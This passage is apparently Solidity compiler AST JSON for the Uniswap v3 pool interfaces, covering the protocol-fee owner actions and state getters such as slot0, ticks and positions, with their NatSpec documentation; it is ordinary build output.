									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1589,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1586,
												"mutability": "mutable",
												"name": "feeProtocol0",
												"nameLocation": "470:12:7",
												"nodeType": "VariableDeclaration",
												"scope": 1591,
												"src": "464:18:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1585,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "464:5:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1588,
												"mutability": "mutable",
												"name": "feeProtocol1",
												"nameLocation": "490:12:7",
												"nodeType": "VariableDeclaration",
												"scope": 1591,
												"src": "484:18:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1587,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "484:5:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "463:40:7"
									},
									"returnParameters": {
										"id": 1590,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "512:0:7"
									},
									"scope": 1606,
									"src": "440:73:7",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1592,
										"nodeType": "StructuredDocumentation",
										"src": "519:483:7",
										"text": "@notice Collect the protocol fee accrued to the pool\n @param recipient The address to which collected protocol fees should be sent\n @param amount0Requested The maximum amount of token0 to send, can be 0 to collect fees in only token1\n @param amount1Requested The maximum amount of token1 to send, can be 0 to collect fees in only token0\n @return amount0 The protocol fee collected in token0\n @return amount1 The protocol fee collected in token1"
									},
									"functionSelector": "85b66729",
									"id": 1605,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "collectProtocol",
									"nameLocation": "1016:15:7",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1599,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1594,
												"mutability": "mutable",
												"name": "recipient",
												"nameLocation": "1049:9:7",
												"nodeType": "VariableDeclaration",
												"scope": 1605,
												"src": "1041:17:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1593,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1041:7:7",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1596,
												"mutability": "mutable",
												"name": "amount0Requested",
												"nameLocation": "1076:16:7",
												"nodeType": "VariableDeclaration",
												"scope": 1605,
												"src": "1068:24:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1595,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1068:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1598,
												"mutability": "mutable",
												"name": "amount1Requested",
												"nameLocation": "1110:16:7",
												"nodeType": "VariableDeclaration",
												"scope": 1605,
												"src": "1102:24:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1597,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1102:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1031:101:7"
									},
									"returnParameters": {
										"id": 1604,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1601,
												"mutability": "mutable",
												"name": "amount0",
												"nameLocation": "1159:7:7",
												"nodeType": "VariableDeclaration",
												"scope": 1605,
												"src": "1151:15:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1600,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1151:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1603,
												"mutability": "mutable",
												"name": "amount1",
												"nameLocation": "1176:7:7",
												"nodeType": "VariableDeclaration",
												"scope": 1605,
												"src": "1168:15:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1602,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1168:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1150:34:7"
									},
									"scope": 1606,
									"src": "1007:178:7",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 1607,
							"src": "187:1000:7",
							"usedErrors": [],
							"usedEvents": []
						}
					],
					"src": "45:1143:7"
				},
				"id": 7
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol": {
				"ast": {
					"absolutePath": "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol",
					"exportedSymbols": {
						"IUniswapV3PoolState": [
							1714
						]
					},
					"id": 1715,
					"license": "GPL-2.0-or-later",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1608,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:8"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "IUniswapV3PoolState",
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1609,
								"nodeType": "StructuredDocumentation",
								"src": "71:169:8",
								"text": "@title Pool state that can change\n @notice These methods compose the pool's state, and can change with any frequency including multiple times\n per transaction"
							},
							"fullyImplemented": false,
							"id": 1714,
							"linearizedBaseContracts": [
								1714
							],
							"name": "IUniswapV3PoolState",
							"nameLocation": "250:19:8",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"documentation": {
										"id": 1610,
										"nodeType": "StructuredDocumentation",
										"src": "276:1140:8",
										"text": "@notice The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas\n when accessed externally.\n @return sqrtPriceX96 The current price of the pool as a sqrt(token1/token0) Q64.96 value\n tick The current tick of the pool, i.e. according to the last tick transition that was run.\n This value may not always be equal to SqrtTickMath.getTickAtSqrtRatio(sqrtPriceX96) if the price is on a tick\n boundary.\n observationIndex The index of the last oracle observation that was written,\n observationCardinality The current maximum number of observations stored in the pool,\n observationCardinalityNext The next maximum number of observations, to be updated when the observation.\n feeProtocol The protocol fee for both tokens of the pool.\n Encoded as two 4 bit values, where the protocol fee of token1 is shifted 4 bits and the protocol fee of token0\n is the lower 4 bits. Used as the denominator of a fraction of the swap fee, e.g. 4 means 1/4th of the swap fee.\n unlocked Whether the pool is currently locked to reentrancy"
									},
									"functionSelector": "3850c7bd",
									"id": 1627,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "slot0",
									"nameLocation": "1430:5:8",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1611,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1435:2:8"
									},
									"returnParameters": {
										"id": 1626,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1613,
												"mutability": "mutable",
												"name": "sqrtPriceX96",
												"nameLocation": "1506:12:8",
												"nodeType": "VariableDeclaration",
												"scope": 1627,
												"src": "1498:20:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 1612,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "1498:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1615,
												"mutability": "mutable",
												"name": "tick",
												"nameLocation": "1538:4:8",
												"nodeType": "VariableDeclaration",
												"scope": 1627,
												"src": "1532:10:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1614,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1532:5:8",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1617,
												"mutability": "mutable",
												"name": "observationIndex",
												"nameLocation": "1563:16:8",
												"nodeType": "VariableDeclaration",
												"scope": 1627,
												"src": "1556:23:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 1616,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "1556:6:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1619,
												"mutability": "mutable",
												"name": "observationCardinality",
												"nameLocation": "1600:22:8",
												"nodeType": "VariableDeclaration",
												"scope": 1627,
												"src": "1593:29:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 1618,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "1593:6:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1621,
												"mutability": "mutable",
												"name": "observationCardinalityNext",
												"nameLocation": "1643:26:8",
												"nodeType": "VariableDeclaration",
												"scope": 1627,
												"src": "1636:33:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 1620,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "1636:6:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1623,
												"mutability": "mutable",
												"name": "feeProtocol",
												"nameLocation": "1689:11:8",
												"nodeType": "VariableDeclaration",
												"scope": 1627,
												"src": "1683:17:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1622,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "1683:5:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1625,
												"mutability": "mutable",
												"name": "unlocked",
												"nameLocation": "1719:8:8",
												"nodeType": "VariableDeclaration",
												"scope": 1627,
												"src": "1714:13:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 1624,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1714:4:8",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1484:253:8"
									},
									"scope": 1714,
									"src": "1421:317:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1628,
										"nodeType": "StructuredDocumentation",
										"src": "1744:168:8",
										"text": "@notice The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool\n @dev This value can overflow the uint256"
									},
									"functionSelector": "f3058399",
									"id": 1633,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "feeGrowthGlobal0X128",
									"nameLocation": "1926:20:8",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1629,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1946:2:8"
									},
									"returnParameters": {
										"id": 1632,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1631,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 1633,
												"src": "1972:7:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1630,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1972:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1971:9:8"
									},
									"scope": 1714,
									"src": "1917:64:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1634,
										"nodeType": "StructuredDocumentation",
										"src": "1987:168:8",
										"text": "@notice The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool\n @dev This value can overflow the uint256"
									},
									"functionSelector": "46141319",
									"id": 1639,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "feeGrowthGlobal1X128",
									"nameLocation": "2169:20:8",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1635,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2189:2:8"
									},
									"returnParameters": {
										"id": 1638,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1637,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 1639,
												"src": "2215:7:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1636,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2215:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2214:9:8"
									},
									"scope": 1714,
									"src": "2160:64:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1640,
										"nodeType": "StructuredDocumentation",
										"src": "2230:147:8",
										"text": "@notice The amounts of token0 and token1 that are owed to the protocol\n @dev Protocol fees will never exceed uint128 max in either token"
									},
									"functionSelector": "1ad8b03b",
									"id": 1647,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "protocolFees",
									"nameLocation": "2391:12:8",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1641,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2403:2:8"
									},
									"returnParameters": {
										"id": 1646,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1643,
												"mutability": "mutable",
												"name": "token0",
												"nameLocation": "2437:6:8",
												"nodeType": "VariableDeclaration",
												"scope": 1647,
												"src": "2429:14:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1642,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2429:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1645,
												"mutability": "mutable",
												"name": "token1",
												"nameLocation": "2453:6:8",
												"nodeType": "VariableDeclaration",
												"scope": 1647,
												"src": "2445:14:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1644,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2445:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2428:32:8"
									},
									"scope": 1714,
									"src": "2382:79:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1648,
										"nodeType": "StructuredDocumentation",
										"src": "2467:150:8",
										"text": "@notice The currently in range liquidity available to the pool\n @dev This value has no relationship to the total liquidity across all ticks"
									},
									"functionSelector": "1a686502",
									"id": 1653,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "liquidity",
									"nameLocation": "2631:9:8",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1649,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2640:2:8"
									},
									"returnParameters": {
										"id": 1652,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1651,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 1653,
												"src": "2666:7:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1650,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2666:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2665:9:8"
									},
									"scope": 1714,
									"src": "2622:53:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1654,
										"nodeType": "StructuredDocumentation",
										"src": "2681:1244:8",
										"text": "@notice Look up information about a specific tick in the pool\n @param tick The tick to look up\n @return liquidityGross the total amount of position liquidity that uses the pool either as tick lower or\n tick upper,\n liquidityNet how much liquidity changes when the pool price crosses the tick,\n feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0,\n feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1,\n tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick\n secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick,\n secondsOutside the seconds spent on the other side of the tick from the current tick,\n initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false.\n Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0.\n In addition, these values are only relative and must be used only in comparison to previous snapshots for\n a specific position."
									},
									"functionSelector": "f30dba93",
									"id": 1675,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "ticks",
									"nameLocation": "3939:5:8",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1657,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1656,
												"mutability": "mutable",
												"name": "tick",
												"nameLocation": "3951:4:8",
												"nodeType": "VariableDeclaration",
												"scope": 1675,
												"src": "3945:10:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1655,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "3945:5:8",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3944:12:8"
									},
									"returnParameters": {
										"id": 1674,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1659,
												"mutability": "mutable",
												"name": "liquidityGross",
												"nameLocation": "4025:14:8",
												"nodeType": "VariableDeclaration",
												"scope": 1675,
												"src": "4017:22:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1658,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "4017:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1661,
												"mutability": "mutable",
												"name": "liquidityNet",
												"nameLocation": "4060:12:8",
												"nodeType": "VariableDeclaration",
												"scope": 1675,
												"src": "4053:19:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int128",
													"typeString": "int128"
												},
												"typeName": {
													"id": 1660,
													"name": "int128",
													"nodeType": "ElementaryTypeName",
													"src": "4053:6:8",
													"typeDescriptions": {
														"typeIdentifier": "t_int128",
														"typeString": "int128"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1663,
												"mutability": "mutable",
												"name": "feeGrowthOutside0X128",
												"nameLocation": "4094:21:8",
												"nodeType": "VariableDeclaration",
												"scope": 1675,
												"src": "4086:29:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1662,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4086:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1665,
												"mutability": "mutable",
												"name": "feeGrowthOutside1X128",
												"nameLocation": "4137:21:8",
												"nodeType": "VariableDeclaration",
												"scope": 1675,
												"src": "4129:29:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1664,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4129:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1667,
												"mutability": "mutable",
												"name": "tickCumulativeOutside",
												"nameLocation": "4178:21:8",
												"nodeType": "VariableDeclaration",
												"scope": 1675,
												"src": "4172:27:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int56",
													"typeString": "int56"
												},
												"typeName": {
													"id": 1666,
													"name": "int56",
													"nodeType": "ElementaryTypeName",
													"src": "4172:5:8",
													"typeDescriptions": {
														"typeIdentifier": "t_int56",
														"typeString": "int56"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1669,
												"mutability": "mutable",
												"name": "secondsPerLiquidityOutsideX128",
												"nameLocation": "4221:30:8",
												"nodeType": "VariableDeclaration",
												"scope": 1675,
												"src": "4213:38:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 1668,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "4213:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1671,
												"mutability": "mutable",
												"name": "secondsOutside",
												"nameLocation": "4272:14:8",
												"nodeType": "VariableDeclaration",
												"scope": 1675,
												"src": "4265:21:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint32",
													"typeString": "uint32"
												},
												"typeName": {
													"id": 1670,
													"name": "uint32",
													"nodeType": "ElementaryTypeName",
													"src": "4265:6:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1673,
												"mutability": "mutable",
												"name": "initialized",
												"nameLocation": "4305:11:8",
												"nodeType": "VariableDeclaration",
												"scope": 1675,
												"src": "4300:16:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 1672,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "4300:4:8",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "4003:323:8"
									},
									"scope": 1714,
									"src": "3930:397:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1676,
										"nodeType": "StructuredDocumentation",
										"src": "4333:99:8",
										"text": "@notice Returns 256 packed tick initialized boolean values. See TickBitmap for more information"
									},
									"functionSelector": "5339c296",
									"id": 1683,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "tickBitmap",
									"nameLocation": "4446:10:8",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1679,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1678,
												"mutability": "mutable",
												"name": "wordPosition",
												"nameLocation": "4463:12:8",
												"nodeType": "VariableDeclaration",
												"scope": 1683,
												"src": "4457:18:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int16",
													"typeString": "int16"
												},
												"typeName": {
													"id": 1677,
													"name": "int16",
													"nodeType": "ElementaryTypeName",
													"src": "4457:5:8",
													"typeDescriptions": {
														"typeIdentifier": "t_int16",
														"typeString": "int16"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "4456:20:8"
									},
									"returnParameters": {
										"id": 1682,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1681,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 1683,
												"src": "4500:7:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1680,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4500:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "4499:9:8"
									},
									"scope": 1714,
									"src": "4437:72:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1684,
										"nodeType": "StructuredDocumentation",
										"src": "4515:700:8",
										"text": "@notice Returns the information about a position by the position's key\n @param key The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper\n @return _liquidity The amount of liquidity in the position,\n Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke,\n Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke,\n Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke,\n Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke"
									},
									"functionSelector": "514ea4bf",
									"id": 1699,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "positions",
									"nameLocation": "5229:9:8",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1687,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1686,
												"mutability": "mutable",
												"name": "key",
												"nameLocation": "5247:3:8",
												"nodeType": "VariableDeclaration",
												"scope": 1699,
												"src": "5239:11:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 1685,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "5239:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "5238:13:8"
									},
									"returnParameters": {
										"id": 1698,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1689,
												"mutability": "mutable",
												"name": "_liquidity",
												"nameLocation": "5320:10:8",
												"nodeType": "VariableDeclaration",
												"scope": 1699,
												"src": "5312:18:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1688,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "5312:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1691,
												"mutability": "mutable",
												"name": "feeGrowthInside0LastX128",
												"nameLocation": "5352:24:8",
												"nodeType": "VariableDeclaration",
												"scope": 1699,
												"src": "5344:32:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1690,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5344:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1693,
												"mutability": "mutable",
												"name": "feeGrowthInside1LastX128",
												"nameLocation": "5398:24:8",
												"nodeType": "VariableDeclaration",
												"scope": 1699,
												"src": "5390:32:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
